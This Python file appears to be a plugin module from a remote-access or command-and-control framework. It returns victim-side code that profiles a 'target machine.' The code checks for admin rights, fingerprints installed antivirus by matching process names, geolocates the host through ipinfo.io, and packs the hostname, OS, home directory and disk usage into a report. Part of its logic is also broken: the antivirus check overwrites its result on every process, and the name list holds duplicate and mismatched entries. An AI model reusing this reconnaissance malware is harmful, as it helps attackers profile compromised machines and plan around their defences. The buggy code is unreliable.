def module_classification():
    return 'admin/sysinfo'


def module_description():
    return 'Get info about the target machine.'


def run(command=None):
    plugin = '''def run():
        import urllib2, platform, json, socket, os, ctypes, psutil
        try:
            is_admin = os.getuid() == 0
        except AttributeError:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        antivirus = ''
        for proc in psutil.process_iter():
            strProcName = proc.name().replace(".exe","")
            if strProcName == "ekrn" :
                    antivirus = "NOD32"
            elif strProcName == "avgcc" :
                antivirus = "AVG"
            elif strProcName == "avgnt" :
                antivirus = "Avira"
            elif strProcName == "ahnsd" :
                antivirus = "AhnLab-V3"
            elif strProcName == "bdss" :
                antivirus = "BitDefender"
            elif strProcName == "bdv" :
                antivirus = "ByteHero"
            elif strProcName == "clamav" :
                antivirus = "ClamAV"
            elif strProcName == "fpavserver" :
                antivirus = "F-Prot"
            elif strProcName == "fssm32" :
                antivirus = "F-Secure"
            elif strProcName == "avkcl" :
                antivirus = "GData"
            elif strProcName == "engface" :
                antivirus = "Jiangmin"
            elif strProcName == "avp" :
                antivirus = "Kaspersky"
            elif strProcName == "updaterui" :
                antivirus = "McAfee"
            elif strProcName == "msmpeng" :
                antivirus = "microsoft security essentials"
            elif strProcName == "zanda" :
                antivirus = "Norman"
            elif strProcName == "npupdate" :
                antivirus = "nProtect"
            elif strProcName == "inicio" :
                antivirus = "Panda"
            elif strProcName == "sagui" :
                antivirus = "Prevx"
            elif strProcName == "Norman" :
                antivirus = "Sophos"
            elif strProcName == "savservice" :
                antivirus = "Sophos"
            elif strProcName == "saswinlo" :
                antivirus = "SUPERAntiSpyware"
            elif strProcName == "spbbcsvc" :
                antivirus = "Symantec"
            elif strProcName == "thd32" :
                antivirus = "TheHacker"
            elif strProcName == "ufseagnt" :
                antivirus = "TrendMicro"
            elif strProcName == "dllhook" :
                antivirus = "VBA32"
            elif strProcName == "sbamtray" :
                antivirus = "VIPRE"
            elif strProcName == "vrmonsvc" :
                antivirus = "ViRobot"
            elif strProcName == "dllhook" :
                antivirus = "VBA32"
            elif strProcName == "vbcalrt" :
                antivirus = "VirusBuster"
            else:
                antivirus = "Not Found"
    
        obj_Disk = psutil.disk_usage('/')
        response = urllib2.urlopen('http://ipinfo.io/json')
        data = json.load(response)
        if os.name == "posix":
            buffer = "HOMEDIR:        " + os.environ['HOME']  + ' xxx'
        else:
            buffer = "HOMEDIR:        " + os.path.expanduser('~') + ' xxx'
        buffer += "ADMIN:          " + str(is_admin) + 'xxx' 
        buffer += "ANTIVIRUS:      " + antivirus + 'xxx'
        buffer += "HOSTNAME:	" + socket.gethostname()  + 'xxx'
        buffer += "PROVIDER:	" + data['org']  + 'xxx'
        buffer += "CITY:		" + data['city']  + 'xxx'
        buffer += "COUNTRY:	" + data['country']  + 'xxx'
        buffer += "REGION:		" + data['region']  + 'xxx'
        buffer += "OS:		" + platform.system() + " " + platform.release()  + 'xxx'
        buffer += "OSARCH:		" + platform.architecture()[0]  + 'xxx' + 'xxx'
        buffer += "TOTAL SPACE: " + str(obj_Disk.total / (1024.0 ** 3)) + " GB - Used => " + str(obj_Disk.percent) + "<prc> xxx"
        buffer += "USED SPACE:  " + str(obj_Disk.used / (1024.0 ** 3)) + " GB xxx"
        buffer += "FREE SPACE:  " + str(obj_Disk.free / (1024.0 ** 3)) + " GB xxx"
        return buffer'''
    return plugin
